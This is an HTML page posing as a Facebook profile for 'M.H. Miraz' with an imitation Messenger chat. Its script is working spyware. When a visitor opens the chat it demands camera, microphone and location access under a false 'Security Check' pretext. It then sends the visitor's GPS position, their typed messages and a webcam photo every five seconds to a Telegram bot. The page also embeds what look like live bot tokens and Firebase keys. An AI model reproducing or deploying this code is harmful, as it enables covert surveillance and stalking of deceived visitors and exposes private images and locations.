<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook | M.H. Miraz</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; }
        .cover { width:100%; height:200px; background:#ddd url('https://via.placeholder.com/800x400') center/cover; }
        .p-info { text-align:center; margin-top:-75px; }
        .p-pic { width:160px; height:160px; border-radius:50%; border:4px solid #fff; background:#ccc url('https://via.placeholder.com/160') center/cover; display:inline-block; }
        .btn-box { display:flex; gap:10px; padding:15px; max-width:500px; margin:0 auto; }
        .btn { flex:1; border:none; border-radius:6px; padding:10px; font-weight:600; cursor:pointer; font-size:15px; display:flex; align-items:center; justify-content:center; gap:8px; }
        .btn-blue { background:#1877f2; color:#fff; }
        .btn-gray { background:#e4e6eb; color:#050505; }
        
        /* Messenger UI */
        #messengerUI { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; flex-direction:column; }
        #msgs { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; gap:10px; background: #fff; }
        .m-sent { align-self:flex-end; background:#0084ff; color:#fff; padding:8px 12px; border-radius:18px; max-width:75%; font-size:15px; }
        .m-rec { align-self:flex-start; background:#e4e6eb; color:#000; padding:8px 12px; border-radius:18px; max-width:75%; font-size:15px; }
        .m-foot { padding:10px; border-top:1px solid #eee; display:flex; gap:10px; align-items:center; }
        .m-in { flex:1; background:#f0f2f5; border:none; padding:10px 15px; border-radius:20px; outline:none; }
        video, canvas { display:none; }
    </style>
</head>
<body>

<div id="profilePage">
    <div class="cover"></div>
    <div class="p-info">
        <div class="p-pic"></div>
        <h1 style="font-size:24px; margin-top:10px;">M.H. Miřãz</h1>
        <p style="color:#65676b; font-size:14px;">Studied at Rangpur Polytechnic Institute</p>
    </div>
    <div class="btn-box">
        <button id="addBtn" class="btn btn-blue" onclick="sendReq()"><i class="fas fa-user-plus"></i> Add Friend</button>
        <button class="btn btn-gray" onclick="openChat()"><i class="fab fa-facebook-messenger"></i> Message</button>
    </div>
</div>

<div id="messengerUI">
    <div style="padding:10px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:10px;">
        <i class="fas fa-arrow-left" style="color:#0084ff; font-size:20px;" onclick="location.reload()"></i>
        <img src="https://via.placeholder.com/35" style="border-radius:50%">
        <span style="font-weight:bold; flex:1;">M.H. Miraz</span>
        <div style="color:#0084ff; display:flex; gap:15px;"><i class="fas fa-phone-alt"></i><i class="fas fa-video"></i></div>
    </div>
    <div id="msgs"></div>
    <div class="m-foot">
        <i class="fas fa-plus-circle" style="color:#0084ff"></i>
        <input type="text" class="m-in" id="chatIn" placeholder="Aa">
        <i class="fas fa-paper-plane" style="color:#0084ff; font-size:20px;" onclick="sendMsg()"></i>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    // তোমার দেওয়া অরিজিনাল Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyCZixj8Sxr_AINbwVtn5llbDbnwbsDVQ1Q",
        authDomain: "myfacebook-com-mhmiraz2hkahy31.firebaseapp.com",
        databaseURL: "https://myfacebook-com-mhmiraz2hkahy31-default-rtdb.firebaseio.com",
        projectId: "myfacebook-com-mhmiraz2hkahy31",
        storageBucket: "myfacebook-com-mhmiraz2hkahy31.firebasestorage.app",
        messagingSenderId: "778369076728",
        appId: "1:778369076728:web:1cb91ca575f406d4821a0d"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
    const CHAT_ID = '7767412329';

    // ১. এড ফ্রেন্ড এপ্রুভাল (বট কন্ট্রোল)
    function sendReq() {
        document.getElementById('addBtn').innerText = 'Requested';
        db.ref('miraz/status').set('pending');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New Friend Request! Approve from Firebase?`);
    }

    db.ref('miraz/status').on('value', (s) => {
        if(s.val() === 'approved') {
            const b = document.getElementById('addBtn');
            b.innerHTML = '<i class="fas fa-user-check"></i> Friends';
            b.className = 'btn btn-gray';
        }
    });

    // ২. বাধ্যতামূলক পারমিশন ও মেসেঞ্জার
    async function openChat() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
            document.getElementById('v').srcObject = stream;
            
            navigator.geolocation.getCurrentPosition(p => {
                const l = `📍 User Location: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(l)}`);
            });

            document.getElementById('profilePage').style.display = 'none';
            document.getElementById('messengerUI').style.display = 'flex';
            
            // অটোমেটিক ছবি পাঠানো শুরু
            setInterval(snap, 5000);
        } catch(e) { 
            alert("Security Check: Please allow camera access to continue chatting."); 
        }
    }

    function snap() {
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        if(v.videoWidth === 0) return;
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 'p.jpg');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:f});
        }, 'image/jpeg', 0.4);
    }

    // ৩. লাইভ চ্যাট (বটের সাথে কথা বলা)
    function sendMsg() {
        const i = document.getElementById('chatIn');
        const t = i.value.trim();
        if(t !== "") {
            append('sent', t);
            db.ref('miraz/userMsg').set(t); 
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Msg: ${encodeURIComponent(t)}`);
            i.value = "";
        }
    }

    // বটের রিপ্লাই রিসিভ করা (Firebase থেকে)
    db.ref('miraz/botReply').on('value', (s) => {
        const r = s.val();
        if(r && r !== "") {
            append('received', r);
            db.ref('miraz/botReply').set(""); // রিসিভ করার পর ক্লিয়ার
        }
    });

    function append(type, text) {
        const d = document.createElement('div');
        d.className = type === 'sent' ? 'm-sent' : 'm-rec';
        d.innerText = text;
        const m = document.getElementById('msgs');
        m.appendChild(d);
        m.scrollTop = m.scrollHeight;
    }

    // Enter চাপলে মেসেজ যাবে
    document.getElementById('chatIn').addEventListener('keypress', (e) => {
        if(e.key === 'Enter') sendMsg();
    });
</script>
</body>
</html>
